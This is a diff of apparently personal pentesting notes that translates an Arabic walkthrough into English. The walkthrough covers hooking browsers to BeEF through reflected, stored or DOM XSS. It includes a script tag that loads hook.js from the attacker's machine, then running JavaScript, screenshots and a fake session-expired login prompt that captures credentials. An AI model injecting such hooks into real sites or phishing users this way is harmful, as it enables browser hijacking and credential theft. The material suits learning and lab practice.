@@ -238,152 +238,190 @@ Using this technique, the payload successfully bypassed the filter and executed.
 ![](../../../Images/Pasted%20image%2020260714211247.png)
 
 ---
-#  Hooking Victims To BeEF Using Reflected XSS
+# Hooking Victims to BeEF Using Reflected XSS
 
-اولا ما هي  أداة ال Beef (اشرح باختصار)
+## What is BeEF?
 
-اولا نشغل أداة ال Beef باستخدام الأمر
-```
+**BeEF (Browser Exploitation Framework)** is a browser exploitation framework used to interact with and control browsers that have been hooked through vulnerabilities such as **XSS (Cross-Site Scripting)**. It allows an attacker to gather information about the victim’s browser and execute JavaScript-based actions within the context of the victim’s session.
+
+---
+
+## Starting BeEF
+
+First, we start the BeEF framework using the following command:
+
+```bash
 beef-xss-start
 ```
 
 ![](../../../Images/Pasted%20image%2020260722204748.png)
 
-ثم ندخل على الرابط التي تم اعطاءنا اياه من قبل الأداة 
+After starting the framework, BeEF provides a local web interface URL:
 
-```
+```text
 http://127.0.0.1:3000/ui/panel
 ```
 
 ![](../../../Images/Pasted%20image%2020260722204900.png)
 
+---
 
-ندخل اليوزر وكلمة المرور الإفتراضية
+## Logging into BeEF
 
+We log in using the default credentials:
+
+```text
+Username: beef
+Password: beef
 ```
-beef
-beef
-```
 
-أو اذا  تم طلب منا تغير الباسورد عند التثبيت ندخلها كما فعلناها
+If a custom password was configured during installation, we use that password instead.
 
 ![](../../../Images/Pasted%20image%2020260722205129.png)
 
-
-ثم انتقلنا الى الداش بورت ولوحة التحكم الكامل بالأدة
+After authentication, we gain access to the BeEF dashboard and full control panel.
 
 ![](../../../Images/Pasted%20image%2020260722205214.png)
 
-الان سوف نبدأ أن نستغل مع ثغرة xss storted
-طبعا تشتغل مع اي نوع ثغرة سواء Refelcted أو XSS أو DOM
+---
 
-اولا ننسخ الكود التي تم اقتراحه من الأداة نفسها عند التشغيل 
-وهذا الكود عنما نوضعه في  اي مكان عليه ثغرة XSS بمجرد ان يضغط المستخدم على المكان القابل للاستغلال يتم الاتصال تلقائي على الأداة
+# Exploiting XSS to Hook Victims
 
-```
+We will use BeEF together with an **XSS vulnerability**.
+
+This technique works with:
+
+- Reflected XSS
+- Stored XSS
+- DOM-Based XSS
+
+When BeEF starts, it provides a JavaScript hook:
+
+```html
 <script src="http://<IP>:3000/hook.js"></script>
 ```
 
 ![](../../../Images/Pasted%20image%2020260722205538.png)
 
-ملاحظة نضع الاي بي الخاص بالمشين حقنا عشان يجينا الاتصال عليها 
+> **Note:** Replace `<IP>` with the IP address of your attack machine.
 
-ثم نضع الكود في المكان القابل للاستغلال
+This hook is inserted into a vulnerable XSS input.
+
 ![](../../../Images/Pasted%20image%2020260722205746.png)
 
-بمجرد أن يدخل أي مستخدم على هذه الصفحة يتم عرضه في أداة ال beef
+As soon as a victim visits the vulnerable page, their browser automatically connects to the BeEF server.
 
-الان هذا المستخدم دخل على هذه الصفحة بشكل عادي
+---
+
+## Victim Connection
+
+A normal user visits the page.
 
 ![](../../../Images/Pasted%20image%2020260722205859.png)
 
-تم عرضه في أداة ال Beef
+Immediately, the victim appears inside the BeEF dashboard.
 
 ![](../../../Images/Pasted%20image%2020260722205942.png)
 
 ---
 
-# Interacting With Hooked Targets
+# Interacting with Hooked Targets
 
-من هنا يتم عرض
-ip address  الضحية
-location
-version 
-name
-arch 
-and more ..!
+From the dashboard, BeEF displays information such as:
+
+- IP address
+- Location
+- Browser version
+- Browser name
+- Operating system architecture
+- And more
+
 ![](../../../Images/Pasted%20image%2020260722210345.png)
 
+---
 
-# Running Basic Commands On Victims
+# Running Basic Commands on Victims
 
-من هذه الخانة نستطيع استخدام العديد من الأوامر
+BeEF provides many built-in modules that can be executed against the hooked browser.
 
 ![](../../../Images/Pasted%20image%2020260722211625.png)
 
-مثلا لو نريد ان نظهر للضحية رسالة شاشة منبثقة 
-نستخدم هذا الأمر
+---
+
+## Displaying a Popup Message
+
+To display a popup message on the victim’s browser, we can use the **Alert Dialog** module.
+
 ![](../../../Images/Pasted%20image%2020260722211720.png)
 
-ثم نكتب الكلام التي نريد عرضها للفكتم ونضغة على زر التنفيذ
+We enter the message we want to display and click **Execute**.
 
 ![](../../../Images/Pasted%20image%2020260722211811.png)
 
-بمجرد ان يفتح الضحية المتصفح يتم عرض الشاشة المنبثقة
+When the victim’s browser processes the command, the popup appears on their screen.
 
 ![](../../../Images/Pasted%20image%2020260722212251.png)
 
+---
 
-او مثلا لو اردنا ان ننفذ أوامر جافا سكربت يمكن ان نستخدم هذا الكود 
-ثم نبحث عن أي امر جافا سكربت مفيد
+## Executing Custom JavaScript
+
+We can also run arbitrary JavaScript code using the **Execute JavaScript** module.
 
 ![](../../../Images/Pasted%20image%2020260722212610.png)
 
-وسيتم عرض الأوامر عند الضحية
+Any JavaScript command we provide will be executed within the victim’s browser context.
 
 ![](../../../Images/Pasted%20image%2020260722212640.png)
 
-لو نريد ان نفعل سكرين شوت على الضحية نستخدم هذا الكود
+---
+
+## Taking a Screenshot
+
+To capture the victim’s browser view, we can use the screenshot module.
 
 ![](../../../Images/Pasted%20image%2020260722212841.png)
 
-بعد تنفيذ الأمر يتم عرض لقطة شاشة لجهاز الضحية
+After execution, BeEF returns a screenshot of the victim’s browser.
 
 ![](../../../Images/Pasted%20image%2020260722213021.png)
 
-# Stealing CredentialsPasswords Using A Fake Login Prompt
+---
 
-عشان نعرف اليوزر والباسورد نستخدم السوشل انجنيرنج 
-نعرض للمستخدم ان جلسته انتهت ويجب عليه ادخال اليوزر والباسورد بمجرد ان يدخل ال creds  سوف نحصل عليها مباشرة
+# Stealing Credentials Using a Fake Login Prompt
 
-عشان ننفذ هذا 
-ندخل الى قسم السوشل انجنرينج
+A common social engineering technique is to present a fake login page and convince the victim that their session has expired.
 
+When the victim re-enters their credentials, BeEF captures them.
+
+---
+
+## Opening the Social Engineering Section
+
+We navigate to the **Social Engineering** category.
 
 ![](../../../Images/Pasted%20image%2020260722213551.png)
 
-
-اخترنا هذا الخيار عشان نفعل صفحة وهمية
+We select the module responsible for displaying a fake authentication page.
 
 ![](../../../Images/Pasted%20image%2020260722213705.png)
 
-فعلنا كل الاعدادات ونوع الصفحة التي نريدها ان تظهر
+We configure the page appearance and choose the type of login prompt we want to display.
 
 ![](../../../Images/Pasted%20image%2020260722213755.png)
 
-بمجرد ان شغلناها تظهر صفحة عند الفكتم ان جلسته انتهت ولازم يدخل CREDS  مرة اخرى
+Once executed, the victim sees a message indicating that their session has expired and that they must log in again.
 
 ![](../../../Images/Pasted%20image%2020260722214410.png)
 
-بمجرد ان يدخلها الفكتمم
+The victim enters their credentials.
 
 ![](../../../Images/Pasted%20image%2020260722214440.png)
 
-حصلنا عليها !..
+BeEF immediately captures the submitted username and password.
 
 ![](../../../Images/Pasted%20image%2020260722214520.png)
 
-
-
+---
 
 
